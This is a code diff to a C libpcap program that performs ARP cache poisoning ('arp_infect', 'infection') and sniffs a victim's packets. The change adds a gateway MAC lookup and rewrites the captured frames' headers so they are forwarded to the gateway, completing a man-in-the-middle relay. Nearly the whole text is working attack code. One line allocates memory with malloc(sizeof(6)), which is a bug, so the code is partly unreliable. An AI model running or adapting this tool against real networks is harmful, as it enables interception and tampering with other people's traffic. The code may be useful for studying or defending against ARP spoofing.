@@ -166,6 +166,7 @@ void *infection(void *data){
 	}
 }
 
+
 void *sniff_packet(void *data){
 	argu_group *argu = (argu_group *)data;
 	//pcap_t *handle = argu->handle;
@@ -173,6 +174,8 @@ void *sniff_packet(void *data){
 	u_char *target_mac = argu->target_mac;
 	struct in_addr *senderIP = argu->senderIP;
 	struct in_addr *targetIP = argu->targetIP;
+	struct in_addr *myIP = argu->myIP;
+	u_char *gateway_mac = argu->gateway_mac;
 
 	pcap_t *handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -234,28 +237,30 @@ void *sniff_packet(void *data){
 					memcpy(send_packet,packet,74);
 					send_ether = (struct etherhdr *)(send_packet);
 					send_iphdr = (struct iphdr *)(send_packet+sizeof(struct etherhdr));
-					memcpy(send_ether->dst,target_mac,6);
+					memcpy(send_ether->dst,gateway_mac,6);
 					memcpy(send_ether->src,sender_mac,6);
-					memcpy(&(send_iphdr->ip_src.s_addr),send_packet+30,4);
-					memcpy(&(send_iphdr->ip_dst.s_addr),senderIP,4);
-					//memcpy(send_iphdr->ip_dst.s_addr,senderIP,4);
-					send_icmp = (struct icmphdr *)(send_packet+sizeof(struct etherhdr)+sizeof(struct iphdr));
+					//memcpy(&(send_iphdr->ip_src.s_addr),send_packet+30,4);
+					memcpy(&(send_iphdr->ip_src.s_addr),senderIP,4);
+					//send_icmp = (struct icmphdr *)(send_packet+sizeof(struct etherhdr)+sizeof(struct iphdr));
 					//printf("icmp type : %d\n",send_icmp->type);
-					memcpy(&(send_icmp->type),"\x00",sizeof(send_icmp->type));
+					//memcpy(&(send_icmp->type),"\x00",sizeof(send_icmp->type));
 					//printf("checksum : %x , %x\n",htons(send_icmp->checksum),htons(send_icmp->checksum+8));
-					send_icmp->checksum += 8;
+					//send_icmp->checksum += 8;
 					printf("\n[*] send packet dump\n");
 					packet_dump(send_packet,74);
 					printf("end\n");
 					printf("destination mac : "); print_mac(send_ether->dst);
 					printf("source mac : "); print_mac(send_ether->src);
+					printf("gateway mac : "); print_mac(gateway_mac);
 					printf("surce IP : %x\n",htonl(send_iphdr->ip_src.s_addr));
 					printf("destination IP : %x\n",htonl(send_iphdr->ip_dst.s_addr));
-					printf("ICMP type : %x\n",send_icmp->type);
-					printf("ICMP checksum : %x\n",htons(send_icmp->checksum));
+					//printf("ICMP type : %x\n",send_icmp->type);
+					//printf("ICMP checksum : %x\n",htons(send_icmp->checksum));
 					while(1){
-						if(pcap_sendpacket(handle,send_packet,74) == 0)
+						if(pcap_sendpacket(handle,send_packet,74) == 0){
+							printf("send success\n");
 							break;
+						}
 					}
 
 					free(send_packet);
@@ -272,7 +277,7 @@ int main(int argc, char* argv[])
 	u_char *packet, *recv_packet;
 	u_char *dev, errbuf[PCAP_ERRBUF_SIZE];
 	struct in_addr myIP, senderIP, targetIP;
-	u_char *my_mac, *sender_mac;
+	u_char *my_mac, *sender_mac, *gateway_mac;
 	u_char addr[4];
 	u_char buf[30];
 
@@ -315,13 +320,16 @@ int main(int argc, char* argv[])
  		printf("\n[-] device do not provide ethernet header!\n");
  		exit(1);
  	}
-
+ 	gateway_mac = (u_char *)malloc(sizeof(6));
+ 	memcpy(gateway_mac,arp_broad(handle,my_mac,"\xff\xff\xff\xff\xff\xff",&myIP,&targetIP),6);
+ 	//print_mac(gateway_mac);
  	// ARP Broadcast
  	printf("\n[+] ARP Broadcast!\n");
  	sender_mac = arp_broad(handle,my_mac,"\xff\xff\xff\xff\xff\xff",&myIP,&senderIP);
  	arp_infect(handle,my_mac,sender_mac,&senderIP,&targetIP);
  	// ARP infection success
-
+ 	printf("gateway mac : "); print_mac(gateway_mac);
+ 	printf("sender mac : "); print_mac(sender_mac);
 
  	argu = (argu_group *)malloc(sizeof(argu_group));
  	argu->handle = handle;
@@ -329,6 +337,8 @@ int main(int argc, char* argv[])
  	argu->sender_mac = my_mac;
  	argu->targetIP = &targetIP;
  	argu->target_mac = sender_mac;
+ 	argu->myIP = &myIP;
+ 	argu->gateway_mac = gateway_mac;
  /*
  	print_mac(argu->sender_mac);
  	print_mac(argu->target_mac);
@@ -352,6 +362,8 @@ int main(int argc, char* argv[])
 
  	pthread_join(p_thread[0], (void **)&status);
  	pthread_join(p_thread[1], (void **)&status);
+
+ 	free(gateway_mac);
  	free(argu);
 	return 0;
 }
